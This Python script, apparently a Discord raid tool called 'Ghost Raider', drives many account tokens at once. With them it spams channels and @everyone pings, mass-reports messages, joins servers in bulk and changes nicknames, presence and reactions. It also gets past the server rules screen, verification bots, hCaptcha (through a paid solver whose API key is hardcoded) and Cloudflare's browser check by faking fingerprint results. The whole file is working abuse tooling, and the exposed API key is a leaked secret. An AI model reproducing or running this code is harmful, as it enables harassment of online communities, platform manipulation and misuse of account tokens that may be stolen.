import time
import threading
import os
import random
import discum as discum
import requests
import threading
import emoji as eeemj
import json
from capmonster_python import HCaptchaTask
from anticaptchaofficial.hcaptchaproxyless import hCaptchaProxyless
from concurrent.futures import ThreadPoolExecutor
import tls_client
import re
import websocket
import base64
import httpx
import time
from colorama import Fore

import re
import binascii
import tls_client
kusi = None
def bypass(token, guildid, session):
    headers = get_headers()
    headers["Authorization"] = token
    proxies = get_proxies()[0]
    try:
        payload = session.get(f"https://discord.com/api/v9/guilds/{guildid}/member-verification?with_guild=false", headers=headers, proxy=proxies).json()
        req = session.put(f"https://discord.com/api/v9/guilds/{guildid}/requests/@me", headers=headers, json=payload, proxy=proxies)
        if req.status_code == 201:
            print("Bypassed")
            return
        else:
            print(f"Bypass失敗;;")
            return
    except Exception as err:
        print(f"例外が発生しました。")
def get_channels(tokens,guildid):
    while True:
        headers = get_headers()
        headers["authorization"] = tokens
        channels = []
        session = get_session()
        proxy = get_proxies()
        req = session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers=headers)
        if req.status_code == 200:
            for channel in req.json():
                if 'bitrate' not in channel and channel['type'] == 0:
                    if channel not in channels:
                        channels.append(channel["id"])
            return channels
            break
        else:
            continue
def get_proxies():
    """Proxies"""
    global kusi
    return None, None
    #else:
    #    proxy = random.choice(kusi)
    #    proxy_tlsclient = {"http": "http://" + proxy, "https": "https://" + proxy}
    #    if "@" in proxy:
    #        uspw = proxy[proxy.find("@")+1:]
    #        ip = proxy[:proxy.find(":")]
    #        port = proxy[proxy.find(":")+1:proxy.find("@")]
    #        user = uspw[:uspw.find(":")]
    #        passwordd = uspw[uspw.find(":")+1:]
    #    else:
    #        ip = proxy[:proxy.find(":")]
    #        port = proxy[proxy.find(":")+1:]
    #        user = None
    #        passwordd = None
    #    proxy_ws = {
    #        "http_proxy_host": ip,
    #        "http_proxy_port": port,
    #        "proxy_type": "https",
    #        "http_proxy_auth": [
    #            user,
    #            passwordd
    #        ]
    #    }
    #    return proxy_tlsclient, proxy_ws
def get_session():
    session = tls_client.Session(client_identifier="chrome_105")
    headers = {
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Accept-Language": "en-US",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
        "X-Debug-Options": "bugReporterEnabled",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }
    reeq = session.get("https://discord.com/", headers=headers)
    html = reeq.text
    r = str(re.findall(r"r:'[^']*'", html)[0]).replace("r:'", "").replace("'", "")
    m = str(re.findall(r"m:'[^']*'", html)[0]).replace("m:'", "").replace("'", "")
    payload = {
        "m": m,  # __CF$cv$params
        "results": [
            str(binascii.b2a_hex(os.urandom(16)).decode('utf-8')),
            str(binascii.b2a_hex(os.urandom(16)).decode('utf-8'))
        ],
        "timing": random.randint(40, 120),  # Execution time
        "fp": {
            "id": 3,
            "e": {
                "r": [
                    1920,  # Height
                    1080   # Width
                ],
                "ar": [
                    1040,  # availHeight
                    1920   # availWidth
                ],
                "pr": 1,      # Pixel Ratio
                "cd": 24,     # Color Depth
                "wb": False,  # Web-driver
                "wp": False,  # PhantomCall
                "wn": False,  # NightMare
                "ch": True,   # Chrome
                "ws": False,  # Selenium
                "wd": False   # domAutomation
            }
        }
    }
    headers["content-type"] = "application/json"
    session.post(f'https://discord.com/cdn-cgi/challenge-platform/h/b/cv/result/{r}', headers=headers, json=payload)
    return session
def get_headers(option=None):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        "Accept-language": "en-US",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }
    xxx = {
        "os": "Windows",
        "browser": "Chrome",
        "device": "",
        "system_locale": "en-US",
        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        "browser_version": "107.0.0.0",
        "os_version": "10",
        "referrer": "",
        "referring_domain": "",
        "referrer_current": "",
        "referring_domain_current": "",
        "release_channel": "stable",
        "client_build_number": 160996,
        "client_event_source": None
    }
    headers["x-super-properties"] = base64.b64encode(json.dumps(xxx, separators=(',', ':')).encode()).decode()
    return headers

class Color:
	BLACK          = '\033[30m'#(文字)黒
	RED            = '\033[31m'#(文字)赤
	GREEN          = '\033[32m'#(文字)緑
	YELLOW         = '\033[33m'#(文字)黄
	BLUE           = '\033[34m'#(文字)青
	MAGENTA        = '\033[35m'#(文字)マゼンタ
	CYAN           = '\033[36m'#(文字)シアン
	WHITE          = '\033[37m'#(文字)白
	COLOR_DEFAULT  = '\033[39m'#文字色をデフォルトに戻す
	BOLD           = '\033[1m'#太字
	UNDERLINE      = '\033[4m'#下線
	INVISIBLE      = '\033[08m'#不可視
	REVERCE        = '\033[07m'#文字色と背景色を反転
	BG_BLACK       = '\033[40m'#(背景)黒
	BG_RED         = '\033[41m'#(背景)赤
	BG_GREEN       = '\033[42m'#(背景)緑
	BG_YELLOW      = '\033[43m'#(背景)黄
	BG_BLUE        = '\033[44m'#(背景)青
	BG_MAGENTA     = '\033[45m'#(背景)マゼンタ
	BG_CYAN        = '\033[46m'#(背景)シアン
	BG_WHITE       = '\033[47m'#(背景)白
	BG_DEFAULT     = '\033[49m'#背景色をデフォルトに戻す
	RESET          = '\033[0m'#全てリセット
def clear_screen():
    if os.name == 'posix':
        _ = os.system('clear')
    else:
        # It is for Windows platfrom
        _ = os.system('cls')

import string
def randomname(n):
        randlst = [random.choice(string.ascii_letters + string.digits) for i in range(n)]
        return ''.join(randlst)

def solvecaptcha(sitekey, rqdata, useragent):
        capmonster = HCaptchaTask("29d9da5d6d5b2395107101482b9877d6")
        capmonster.set_user_agent(useragent)
        task_id = capmonster.create_task(website_url="https://discord.com", website_key=sitekey, custom_data=rqdata)
        result = capmonster.join_task_result(task_id)
        aaa = result.get("gRecaptchaResponse")
        print(f"Captcha Bypass")
        return aaa
def menu():
    clear_screen()
    print(Color.GREEN+"""
      _____ _               _     _____       _     _           
     / ____| |             | |   |  __ \     (_)   | |          
    | |  __| |__   ___  ___| |_  | |__) |__ _ _  __| | ___ _ __ 
    | | |_ | '_ \ / _ \/ __| __| |  _  // _` | |/ _` |/ _ \ '__|
    | |__| | | | | (_) \__ \ |_  | | \ \ (_| | | (_| |  __/ |   
     \_____|_| |_|\___/|___/\__| |_|  \_\__,_|_|\__,_|\___|_|   
    
        | Made By cocoapc911
        | Discord: ここあ#0001
        | Credit: mode=114514
    """+Color.RESET)
    print(Color.BLUE+"""

      01: Spammer                     02: Joiner                   03: Report Spam            04: Ghost Spam         
    
      05: HypeSquad Change            06: Form Creater             07: Leaver                 08: Reaction Spammer

      09: Nickname Changer            10: Yax Bot Verify Bypasser  11: Reply Spammer          12: VC Joiner        
            
      13: Token Checker               14: Token Status             

    """+Color.RESET)
    modes = input("Mode >> ")
    if modes == "1":
        ffs = open('message.txt',"r",encoding="utf-8_sig")
        messages = ffs.read()
        allchannels = input("All Channel y/n >> ")
        if allchannels == "y":
            guild_id  = input("Server Id >> ")
            token = input("Token >> ")
            channel_id = input("Channel Id >> ")
            chlist = get_channels(token,int(guild_id))
        else:
            channel_id = input("Channel id >> ")    
        randoms = int(input("Random Mention数(しない場合0と入力) >> "))
        if randoms > 0:
            if allchannels == "y":
                tokens = token
            else:
                tokens = input("Input Token >> ")
                guild_id = input("Server Id >> ")
            bot = discum.Client(token=tokens, log=False)
            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    bot.gateway.removeCommand({
                        'function': close_after_fetching,
                        'params': {
                            'guild_id': guild_id
                        }
                    })
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(
                    guild_id, channel_id, keep="all",
                    wait=1)  #get all user attributes, wait 1 second between requests
                bot.gateway.command({
                    'function': close_after_fetching,
                    'params': {
                        'guild_id': guild_id
                    }
                })
                bot.gateway.run()
                bot.gateway.resetSession()  #saves 10 seconds when gateway is run again
                return bot.gateway.session.guild(guild_id).members
            members = get_members(guild_id, channel_id)
            memberslist = []
            for memberID in members:
                print(f"メンバーを取得しました。{memberID}")
                memberslist.append(memberID)      
            def memberspam():
                spams = ""
                channel_id = input("Channel Id >> ")
                with open('token.txt') as f:
                        lines = f.readlines()
                        while True:
                            for l in lines:
                                    if allchannels == "y":
                                        channel_id = random.choice(chlist)
                                    for _ in range(randoms):
                                        spams += "<@" + random.choice(memberslist) + "> "
                                    randomed = randomname(10)
                                    payload = {"content": f"{messages}\n{spams}\n" + randomed}
                                    headers = {"authorization": l.rstrip("\n")}
                                    res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                    spams = ""
                                    print("Send: "+randomed)

                                
            while True:
                time.sleep(0.7)
                threading.Thread(target=memberspam).start()
        else:
            def normalspam():
                with ThreadPoolExecutor(max_workers=4) as executor:
                    channel_id = input("Channel Id >> ")
                    with open('token.txt') as f:
                        lines = f.readlines()
                        while True:
                            for l in lines:
                                randoms = randomname(10)
                                try:
                                    if allchannels == "y":
                                        channel_id = random.choice(chlist)
                                    payload = {"content": f"{messages}\n"+randoms}
                                    headers = {"authorization": l.rstrip("\n")}
                                    res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                    spams = ""
                                    print("Send: "+randoms)
                                except Exception as e:
                                    print("Error: "+ e)          
            while True:
                time.sleep(0.4)
                threading.Thread(target=normalspam).start()              
    if modes == "2":
        invid = input("Invite Code >> ")
        rule = input("RuleScreen y/n >> ")
        def join():
            with open('token.txt') as f:
                lines = f.readlines()
                for l in lines:
                    print("start")
                    token = l.rstrip("\n")
                    session = get_session()
                    proxies = get_proxies()[0]
                    headers = get_headers()
                    headers["Referer"] = "https://discord.com/invite/" + invid
                    headers["x-context-properties"] = "eyJsb2NhdGlvbiI6IkFjY2VwdCBJbnZpdGUgUGFnZSJ9"
                    headers["authorization"] = token
                    
                    session.get("https://discord.com/api/v9/experiments?with_guild_experiments=true", headers=headers, proxy=proxies)
                    
                    del headers["x-context-properties"]
                    
                    xcreq = session.get("https://discord.com/api/v9/invites/" + invid + "?with_counts=true&with_expiration=true", headers=headers, proxy=proxies).json()
                    
                    chid = xcreq["channel"]["id"]
                    guildid = xcreq["guild"]["id"]
                    chtype = xcreq["channel"]["type"]
                    xxx = {
                        "location": "Accept Invite Page",
                        "location_guild_id": str(guildid),
                        "location_channel_id": str(chid),
                        "location_channel_type": str(chtype) 
                    }
                    headers["x-context-properties"] = base64.b64encode(json.dumps(xxx, separators=(',', ':')).encode()).decode()
                    try:
                            joinreq = session.post(f"https://discord.com/api/v9/invites/{invid}", headers=headers, json={})
                            if "captcha_key" not in joinreq.json():
                                if "You need to verify your account in order to perform this action." in joinreq.json():
                                    print(f"{token}は死亡しています。")
                                print(f"参加しました。")
                                if rule == "y":
                                    bypass(token, guildid, session)
                            if "captcha_key" in joinreq.json():
                                wsitekey = joinreq.json()['captcha_sitekey']
                                print(f"キャプチャーに検出されました。")
                                crqdata = joinreq.json()["captcha_rqdata"]
                                captchakey = solvecaptcha(sitekey=wsitekey, rqdata=crqdata, useragent=headers["user-agent"])
                                captcha_rqtoken = joinreq.json()["captcha_rqtoken"]
                                payload = {'captcha_key': captchakey, 'captcha_rqtoken': captcha_rqtoken}
                                joinreq2 = session.post(f"https://discord.com/api/v9/invites/{invid}", headers=headers, json=payload)
                                if joinreq2.status_code == 200:
                                    print(f"参加完了")
                                    if option == "y":
                                        bypass(token, guildid, session)
                                else:
                                    print(f"参加失敗")
                                    #continue
                    except Exception as err:
                            print(f"エラーが発生しました。")
        with ThreadPoolExecutor(max_workers=4) as executor:
            executor.submit(join)

    if modes == "3":
        channel_id = input("Channel Id >> ")
        message_id = input("Message Id >>")
        with open('token.txt') as f:
            lines = f.readlines()
            while True:
                for l in lines:
                    try:
                        payload = {"version":"1.0","variant":"3","language":"en","breadcrumbs":[3,14,52],"elements":{},"name":"message","channel_id":f"{channel_id}","message_id":f"{message_id}"}
                        headers = {"authorization": l.rstrip("\n")}
                        res = requests.post(f"https://discord.com/api/v9/reporting/message", headers=headers, json=payload)
                        print(l.rstrip("\n"))
                        print(res.text)
                    except Exception as e:
                        print("Error: "+ e) 
    if modes == "7":
        guild = input("Server Id >> ")
        with open('token.txt') as f:
            lines = f.readlines()
            for l in lines:
                try:
                    headers = {"authorization": l.rstrip("\n")}
                    res = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild}", headers=headers)
                except:
                        print("エラーが発生しました。") 
    import urllib
    if modes == "8":
            emoji = input("emoji >> ")
            channelid = input("Channel Id >> ")
            messageid = input("Message Id >> ")
            with open('token.txt') as f:
                lines = f.readlines()
                for l in lines:
                    try:
                        emojii = eeemj.emojize(emoji, language='alias')
                        emojiaa = urllib.parse.quote(emojii)
                        headers = {"authorization": l.rstrip("\n")}
                        req = requests.put(f"https://discord.com/api/v9/channels/{channelid}/messages/{messageid}/reactions/{emojiaa}/%40me", headers=headers)
                    except:
                        print("Error")
    if modes == "10":
        url = input("Verify URL >> ")
        with open('token.txt') as f:
                lines = f.readlines()

                for l in lines:
                    try:
                        if "yax.life" in url:
                            session = requests.Session()
                            session.get("https://discord.com", headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"})
                            payload = {"authorize": True,"permissions": "0"}
                            headers = {"authorization":l.rstrip("\n"),"content-type":"application/json","user-agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9010 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"}
                            req = session.post(url,headers=headers,json=payload)
                            js = req.json()
                            print(js["location"])
                            headers = {"user-agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9010 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"}
                            session.get(js["location"],headers=headers)
                            #https://discord.com/oauth2/authorize?client_id=841539874577317888&response_type=code&redirect_uri=https%3A%2F%2Flisxck.fyi%2Fdiscord%2Fcallback&scope=identify%20email%20guilds%20guilds.join&state=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1b2cycnhiNWhteDUiLCJndWlsZCI6IjEwNTQyNDc0ODIzMzIzMDMzNjAiLCJyb2xlIjoiMTA1NDI0NzQ4MjM2NTg1Mzc2NyIsImlhdCI6MTY3Mzk0NDQ1M30.9AptgyMV9-yh-C3Ot1s7ZKU1jZVOc1BT1R3DeP4y5M8  
                            #https://discord.com/api/oauth2/authorize?client_id=928991239192346634&redirect_uri=https://yax.life/api/callback/&response_type=code&scope=identify%20guilds.join&state=1038424665313525850
                        elif "kodai0417" in url:
                            session = requests.Session()
                            session.get("https://discord.com", headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"})
                            payload = {"authorize": True,"permissions": 0}
                            headers = {"authorization":l.rstrip("\n"),"content-type":"application/json","user-agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9010 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"}
                            req = session.post(url,headers=headers,json=payload)
                            js = req.json()
                            print(js["location"])
                            headers = {"user-agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9010 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"}
                            yr = session.get(js["location"],headers=headers)                            
                            print(yr.text)
                    except:
                        print("Token死んでるかも")
                menu()
    if modes == "11":
        guild_id = input("Server Id >> ")
        channel_id = input("Channel Id >> ")
        message_id = input("Message Id >>")
        ffs = open('message.txt',"r",encoding="utf-8_sig")
        messages = ffs.read()
        def reply():
            with open('token.txt') as f:
                lines = f.readlines()
                while True:
                    for l in lines:
                            try:
                                randoms = randomname(10)
                                payload = {"content":f"{messages}\n"+randoms,"message_reference":{"guild_id":f"{guild_id}","channel_id":f"{channel_id}","message_id":f"{message_id}"}}
                                headers = {"authorization":l.rstrip("\n")}
                                req = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages",headers=headers,json=payload)
                            except:
                                print("失敗！")
        while True:
            time.sleep(0.2)
            threading.Thread(target=reply).start()
    if modes == "12":
        guild_id = input("Server Id >> ")
        channel_id = input("Voice Channel Id >> ")
        def join(token):
            ws = websocket.WebSocket()
            ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
            ws.send(json.dumps({
                "op":2,
                    "d": {
                        "token": token,
                        "properties": {
                            "$os": "Discord Android",
                            "$browser": "Discord Android",
                            "$device": "Discord Android",
                        },
                        "presence": {
                            "game": {
                                "name": "Ghost Raider"
                            },
                            "status": "online",
                            "since": 0,
                            "activities": [],
                            "afk": False,
                        },
                    },
                    "s": None,
                    "t": None,
            }
                
            )
                    )
            ws.send(
                    json.dumps(
                        {
                            "op": 4,
                            "d": {
                                "guild_id": guild_id,
                                "channel_id": channel_id,
                                "self_mute": False,
                                "self_deaf": True,
                                "self_video": False
                            }
                        }
                    )
            )        
        with open('token.txt') as f:
            lines = f.readlines()
            for l in lines:    
                tokens = l.rstrip("\n")
                threading.Thread(target=join, args=[tokens]).start()
            menu()             
    if modes == "4":
        messages = input("Messages >> ")
        channel_id = input("Channel Id >>")
        with open('token.txt') as f:
            lines = f.readlines()
            while True:
                 for l in lines:
                    try:
                        randoms = randomname(7)
                        payload = {"content": f"{messages} {randoms} " +"||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||@everyone"}
                        headers = {"authorization": l.rstrip("\n")}
                        res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                        time.sleep(0.7)
                    except Exception as e:
                        print("Error: "+ e)         
    if modes == "5":
        house_id = input("1=Bravery 2=Brilliance 3=Balance 4=なし\nHouse Id >> ")
        with open('token.txt') as f:
            lines = f.readlines()
            while True:
                for l in lines:
                    try:
                        if house_id == "4":
                            headers = {"authorization": l.rstrip("\n")}
                            res = requests.delete(f"https://discord.com/api/v9/hypesquad/online", headers=headers)
                            if res.status_code == 204:
                                print(f"{Fore.GREEN} 成功{Fore.RESET}")
                            else: 
                                print(f"{Fore.RED} 失敗{Fore.RESET}")
                            time.sleep(1)
                            menu()
                        payload = {"house_id": house_id}
                        headers = {"authorization": l.rstrip("\n")}
                        res = requests.post(f"https://discord.com/api/v9/hypesquad/online", headers=headers, json=payload)
                        if res.status_code == 204:
                            print(f"{Fore.GREEN} 成功{Fore.RESET}")
                        else: 
                            print(f"{Fore.RED} 失敗{Fore.RESET}")
                        time.sleep(1)
                        menu()
                    except Exception as e:
                        print("Error: "+ e)        
    if modes == "6":
        guild_id = input("Server Id >> ")
        forum_id = input("Forum Id >> ")
        forum_name = input("Forum name >> ")
        forum_message = input("Forum message >> ")
        with open('token.txt') as f:
            lines = f.readlines()
            while True:
                for l in lines:
                    try:
                        randoms = randomname(7)
                        payload = {"name": f"{forum_name} " +randoms, "message": {"content": f"{forum_message}"}}
                        headers = {"authorization": l.rstrip("\n")}
                        res = requests.post(f"https://discord.com/api/v9/channels/{forum_id}/threads?use_nested_fields=true", headers=headers, json=payload)
                        print(l.rstrip("\n"))
                        print(res.text)
                    except Exception as e:
                        print("Error: "+ e) 
    if modes == "9":
        guild_id = input("Server Id >> ")
        nickname = input("Nickname >> ")
        with open('token.txt') as f:
            lines = f.readlines()
            while True:
                for l in lines:
                    try:
                        token=l.rstrip("\n")
                        payload = {"nick": nickname}
                        headers = {"authorization": token}
                        res = requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}/members/@me", headers=headers, json=payload)
                        #print(l.rstrip("\n"))
                        #print(res.text)
                        if res.status_code == 200:
                            print(f"{Fore.GREEN} Success Change {Fore.RESET}{token}")
                        elif res.status_code == 200:
                            print(f"{Fore.YELLOW} Rate Limited {Fore.CYAN}| {Fore.RESET}{token}")    
                        time.sleep(1)
                        menu()
                    except Exception as e:
                        print("Error: "+ e)    
    if modes == "13":
        with open('token.txt','r+') as f:
            for line in f:
                token=line.strip("\n")
                headers = {"Content-Type": "application/json", "authorization": token}
                res = requests.get(f"https://discord.com/api/v9/users/@me", headers=headers)
                if res.status_code == 200:
                    print(f"{Fore.GREEN}  Valid {Fore.CYAN}| {Fore.RESET}{token}")
                elif res.status_code == 429:
                    print(f"{Fore.YELLOW}  Rate Limited {Fore.YELLOW}[{Fore.RESET}429{Fore.YELLOW}] {Fore.CYAN}| {Fore.RESET}{token}")
                else:
                    print(f"{Fore.RED}  Invalid {Fore.CYAN}| {Fore.RESET}{token}")
    if modes == "14":
        status = input("候補 online,idle,dnd \nStatus >> ")
        game = input("Game Name >> ")
        details = input("一行下の文 >> ")
        state = input("二行下の文 >> ")
        with open('token.txt') as f:
            lines = f.readlines()
            for l in lines:    
                tokens = l.rstrip("\n")
                ws = websocket.WebSocket()
                ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
                ws.send(json.dumps({
                    "op":2,
                        "d": {
                            "token": tokens,
                            "properties": {
                                "$os": "Discord Android",
                                "$browser": "Discord Android",
                                "$device": "Discord Android",
                            },
                            "presence": {
                                "game": {                #初期設定
                                    "name": game,        #Ghost Raider
                                    "type": 0,           
                                    "details": details,  #Edited Version
                                    "state": state       #By cocoapc911
                                },
                                "status": status,
                                "since": 0,
                                "activities": [],
                                "afk": False,
                            },
                        },
                        "s": None,
                        "t": None,
                }
                )
                    )
            print(f"\n[\033[32m+\033[0m] Online | {tokens}")
            time.sleep(1)
            menu()
    if modes == "114514":
        print(f"{Fore.GREEN}Creators {Fore.RESET}> {Fore.GREEN}☆にゃにゃっこ☆#5964\n{Fore.GREEN}LINKS {Fore.RESET}> {Fore.BLUE}https://github.com/HACKShinn1204/Ghost-Raider{Fore.RESET}")       
        time.sleep(3)
        menu()
    else:
        print("引数が不正です。")
        time.sleep(1)
        menu()
menu()